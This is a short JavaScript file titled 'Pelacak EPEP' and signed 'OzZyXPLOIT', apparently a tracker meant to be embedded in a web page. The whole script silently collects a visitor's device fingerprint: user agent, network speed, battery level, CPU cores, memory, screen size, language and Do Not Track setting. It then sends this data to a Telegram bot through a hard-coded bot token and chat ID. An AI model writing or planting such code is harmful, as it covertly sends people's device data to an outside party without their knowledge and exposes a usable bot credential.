// Pelacak EPEP
// By OzZyXPLOIT
/////////////////////////
if ('getBattery' in navigator) {
  if (navigator.connection) {
    navigator.getBattery().then(function(battery) {
      var ua = navigator.userAgent;
      var typeconn = navigator.connection.effectiveType;
      var speednetw = navigator.connection.downlink + ' Mbps';
      var rtt = navigator.connection.rtt;
      var exten = navigator.plugins.length;
      var batre = battery.level * 100 + '%';
      var ngecas = battery.charging ? 'Ya' : 'Tidak';
      var cpucore = navigator.hardwareConcurrency;
      var platform = navigator.platform;
      var appVer = navigator.appVersion;
      var appName = navigator.appName;
      var product = navigator.product;
      var lang = navigator.language;
      var cookie = navigator.cookieEnabled;
      var online = navigator.onLine;
      var dnt = navigator.doNotTrack;
      var vendor = navigator.vendor;
      var memo = navigator.deviceMemory || "Not Available";
      var reso = `${screen.width}x${screen.height}`;
      var cd = screen.colorDepth;
      var message = `Pelacak Handal\nSender: OzZyXPLOIT <res@ozzyxploit.xyz>\n\nUser-Agent: ${ua}\nRTT: ${rtt}\nConnection: ${typeconn}\nSpeed: ${speednetw}\nPlugins: ${exten}\nBattery: ${batre}\nCharging: ${ngecas}\nCore: ${cpucore}\nPlatform: ${platform}\nApp Ver: ${appVer}\nApp Name: ${appName}\nProduct: ${product}\nLanguage: ${lang}\nCookie: ${cookie}\nOnline: ${online}\nDoNotTrack: ${dnt}\nVendor: ${vendor}\nMemo: ${memo}\nResolution: ${reso}\nColor Depth: ${cd}`;
      var encURL = encodeURIComponent(message);
      fetch(`https://api.telegram.org/bot6505548655:AAHjGN6WYjiIH9bWD5hpRSH0HqXIy_0jbvE/sendMessage?chat_id=6064818646&text=${encURL}`)
    })
  }
}